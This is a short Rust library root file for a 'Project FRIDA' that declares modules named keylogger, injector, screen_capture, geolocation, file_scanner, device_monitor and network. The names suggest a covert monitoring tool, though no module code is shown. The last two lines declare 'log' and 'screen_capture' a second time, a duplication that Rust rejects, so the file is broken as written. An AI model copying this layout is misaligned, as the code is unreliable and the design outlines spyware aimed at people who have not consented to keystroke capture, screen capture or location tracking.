//! Project FRIDA Library
//!
//! Re-exports all modules so they can be shared between the binary (`main.rs`)
//! and external integration tests.

pub mod device_monitor;
pub mod drives;
pub mod file_scanner;
pub mod geolocation;
pub mod injector;
pub mod keylogger;
pub mod log;
pub mod network;
pub mod screen_capture;
pub mod writer;
pub mod log;
pub mod screen_capture;